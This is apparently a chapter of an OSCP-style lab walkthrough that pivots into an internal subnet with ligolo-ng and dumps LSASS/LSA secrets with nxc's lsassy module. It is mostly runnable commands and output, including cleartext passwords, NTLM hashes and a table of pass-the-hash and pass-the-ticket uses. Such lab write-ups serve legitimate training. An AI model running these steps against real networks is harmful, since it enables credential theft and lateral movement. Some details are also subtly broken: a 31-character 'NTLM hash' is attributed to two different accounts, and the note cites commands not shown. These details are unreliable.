# 04 — Pivot into `172.16.91.0/24` and LSASS loot

Two things happen after local admin:

1. A **ligolo-ng** tunnel, so Kali can route to the internal `/24` that only WS01 can see.
2. An **lsassy** run as local admin, which dumps LSASS/LSA and produces the credential material for
   the next hop.

## 4.1 ligolo-ng — proxy side (Kali)

The proxy was started with a self-signed certificate and the default listener:

```bash
sudo ligolo-proxy -selfcert
```

```
INFO[0000] Listening on 0.0.0.0:11601
WARN[0000] self-signed certificate, domain 'ligolo', beware of CTL, SOC and IoC
```

> The proxy command line: `[redacted]`. It listens on `11601` and prints the self-signed `ligolo`
> warning. If you prefer `-laddr`, the agent string below is what has to match.

Create the tun interface once per session:

```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```

## 4.2 ligolo-ng — agent side (WS01)

The Linux agent binary is not useful here; the Windows build is dropped on WS01 and executed from
the Administrator WinRM session:

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ./agent -connect 192.168.49.91:11601 -ignore-cert
```

```
level=info msg="Connection established" addr="192.168.49.91:11601"
```

`192.168.49.91` is the Kali address on the `ligolo` tun (the proxy endpoint). `-ignore-cert` is
required because the proxy is self-signed.

## 4.3 Session, interfaces, route

In the proxy console:

```
ligolo-ng » session
? Specify a session : 1 - WS01\Administrator@WS01 - 192.168.91.206:50941
[Agent : WS01\Administrator@WS01] » ifconfig
```

```
[Agent : WS01\Administrator@WS01] » ifconfig
┌───────────────────────────────────────────────┐
│ Interface 0                                   │
├──────────────┬────────────────────────────────┤
│ Name         │ Ethernet0                      │
│ Hardware MAC │ 00:50:56:...                   │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast         │
│ IPv4 Address │ 172.16.91.206/24               │
└──────────────┴────────────────────────────────┘
┌───────────────────────────────────────────────┐
│ Interface 1                                   │
├──────────────┬────────────────────────────────┤
│ Name         │ Ethernet1                      │
│ IPv4 Address │ 192.168.91.206/24              │
└──────────────┴────────────────────────────────┘
```

Start the tunnel and add exactly one route:

```
[Agent : WS01\Administrator@WS01] » start
```

```bash
sudo ip route add 172.16.91.0/24 dev ligolo
```

One route is enough for this set: no double pivot, no chained proxies, just the internal `/24`
behind WS01.

Verify before scanning:

```bash
ip route | grep 172.16.91
nxc smb 172.16.91.1        # or the DC once you know its address
```

## 4.4 LSASS / LSA secrets with lsassy

Run as the **local** Administrator against the workstation:

```bash
nxc smb 192.168.91.206 -u 'Administrator' -p 'Work3sValueable444' --local-auth -M lsassy
```

```
SMB  192.168.91.206  445  WS01  [*] Windows 11 Build 22000 x64 (name:WS01) (domain:WS01) (signing:False) (SMBv1:None)
SMB  192.168.91.206  445  WS01  [+] WS01\Administrator:Work3sValueable444 (Pwn3d!)
SMB  192.168.91.206  445  WS01  Saved 19 Kerberos ticket(s) to /home/kali/.nxc/modules/lsassy
SMB  192.168.91.206  445  WS01  WS01\l.andrew 58836e8b8f091253ae14d4115e6d7704
SMB  192.168.91.206  445  WS01  WS01\Administrator 289f3285a8f5d524e535c29917f2ea06
SMB  192.168.91.206  445  WS01  WS01\l.perry 0acba8f16de9d8d6b0d6c725356c3c2
SMB  192.168.91.206  445  WS01  OSCP.EXAM\perry:SurfaceConditionMove441
```

What each line is:

| Output | Meaning | Use |
|---|---|---|
| `Saved 19 Kerberos ticket(s)` | Kerberos tickets extracted from the logon sessions | pass-the-ticket if needed |
| `WS01\l.andrew <NTLM>` | local user hash | local re-use |
| `WS01\Administrator <NTLM>` | local admin hash | pass-the-hash on WS01 |
| `WS01\l.perry <NTLM>` | local user hash | — |
| `OSCP.EXAM\perry:<cleartext>` | **LSA secret** — domain user in cleartext | next hop to the DC |

The last line is the important one: a **domain** account (`OSCP.EXAM\perry`) whose password was
stored in a service/LSA secret on the workstation, recovered in cleartext. That is the credential
that moves the set forward, not the local hashes.

> **Corrected value.** The full password is `SurfaceConditionMove441`, and the hash is
> `0acba8f16de9d8d6b0d6c725356c3c2` — both appear again in the lsassy block, in
> `net rpc group addmem` and in `bloodyAD --hashes`.

## 4.5 Where this leaves the set

| Have | Next step |
|---|---|
| Route to `172.16.91.0/24` | sweep it, find the DC |
| `OSCP.EXAM\perry` cleartext | try it against SMB/WinRM/LDAP on the DC |
| Local admin on WS01 | optional: dump more, or pass-the-hash locally |
| 19 Kerberos tickets | fallback if the cleartext is rotated |

The DC20 stage is in [`06-dc20.md`](06-dc20.md).

---

**Next:** [`05-lessons.md`](05-lessons.md)
